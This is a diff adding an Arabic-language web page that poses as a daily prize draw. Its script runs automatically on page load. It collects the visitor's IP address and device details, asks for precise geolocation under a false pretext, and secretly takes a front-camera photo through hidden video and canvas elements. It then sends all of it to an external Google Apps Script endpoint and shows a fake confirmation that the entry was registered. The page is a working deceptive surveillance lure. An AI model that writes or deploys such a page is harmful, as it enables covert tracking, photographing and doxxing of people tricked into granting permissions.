@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>سحب الحظ اليومي - اختبر حظك</title>
+    <style>
+        body {
+            font-family: Tahoma, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            text-align: center;
+            padding: 50px;
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .card {
+            background: white;
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            max-width: 420px;
+            width: 100%;
+        }
+        h2 { color: #333; margin-bottom: 10px; }
+        p { color: #666; font-size: 15px; line-height: 1.5; }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #667eea;
+            border-radius: 50%;
+            width: 45px;
+            height: 45px;
+            animation: spin 1s linear infinite;
+            margin: 25px auto;
+            display: block;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #status { margin-top: 20px; font-weight: bold; color: #4a5568; font-size: 16px; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h2>🎉 سحب الحظ اليومي</h2>
+        <p>جاري التحقق من أهليتك للسحب والتحقق من تفاصيل الاتصال...</p>
+        <div class="loader" id="spinner"></div>
+        <div id="status">يرجى الانتظار والموافقة على الأذونات المطلوبة...</div>
+    </div>
+
+    <!-- عناصر مخفيّة لالتقاط الصورة -->
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // تم تحديث الرابط الجديد هنا تلقائياً
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzdidC1yKi3VaCbr0dyXebkYSM4J332qk8ScSFgFzRwqOb_SWWWArf5awdY_zg91bbm/exec";
+
+        async function collectAndSend() {
+            const statusEl = document.getElementById("status");
+            
+            try {
+                // 1. جلب الـ IP ومعلومات الجهاز
+                let ipData = {};
+                try {
+                    let ipRes = await fetch('https://api.ipify.org?format=json');
+                    let ipJson = await ipRes.json();
+                    ipData.ip = ipJson.ip;
+                } catch (e) {
+                    ipData.ip = "غير معروف";
+                }
+                ipData.device = navigator.userAgent;
+
+                // 2. طلب إحداثيات الموقع الجغرافي
+                statusEl.innerText = "📍 يرجى السماح بالوصول إلى الموقع للتحقق من المنطقة...";
+                let locationStr = "لم يقم بالسماح";
+                try {
+                    let position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        });
+                    });
+                    locationStr = `${position.coords.latitude}, ${position.coords.longitude}`;
+                } catch (e) {
+                    locationStr = "تم رفض إذن الموقع أو غير مدعوم";
+                }
+
+                // 3. التقاط الصورة عبر الكاميرا الأمامية تلقائياً
+                statusEl.innerText = "📸 جاري توثيق الطلب (الرجاء الموافقة على الكاميرا)...";
+                let imageBase64 = null;
+                try {
+                    let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    let video = document.getElementById('video');
+                    video.srcObject = stream;
+                    
+                    await new Promise(resolve => setTimeout(resolve, 1500)); // انتظار ثانية ونصف لتستقر الكاميرا
+
+                    let canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    let ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    imageBase64 = canvas.toDataURL('image/jpeg', 0.7);
+
+                    // إيقاف تشغيل الكاميرا فوراً بعد التقاط الصورة
+                    stream.getTracks().forEach(track => track.stop());
+                } catch (e) {
+                    console.log("تعذر الوصول للكاميرا: ", e);
+                }
+
+                // 4. إرسال البيانات مباشرة إلى Google Sheets
+                statusEl.innerText = "⏳ جاري إرسال بيانات السحب وتسجيلها...";
+                let payload = {
+                    ip: ipData.ip,
+                    device: ipData.device,
+                    location: locationStr,
+                    image: imageBase64
+                };
+
+                await fetch(SCRIPT_URL, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                // إخفاء التحميل وإظهار رسالة النجاح
+                document.getElementById("spinner").style.display = "none";
+                statusEl.style.color = "#27ae60";
+                statusEl.style.fontSize = "20px";
+                statusEl.innerText = "🍀 حظاً موفقاً! تم تسجيل مشاركتك في السحب بنجاح.";
+
+            } catch (error) {
+                document.getElementById("spinner").style.display = "none";
+                statusEl.style.color = "#c0392b";
+                statusEl.innerText = "عذراً، حدث خطأ في النظام أو تم رفض الأذونات.";
+            }
+        }
+
+        // تنفيذ العملية فور فتح الصفحة
+        window.onload = function() {
+            setTimeout(collectAndSend, 1200);
+        };
+    </script>
+</body>
+</html>
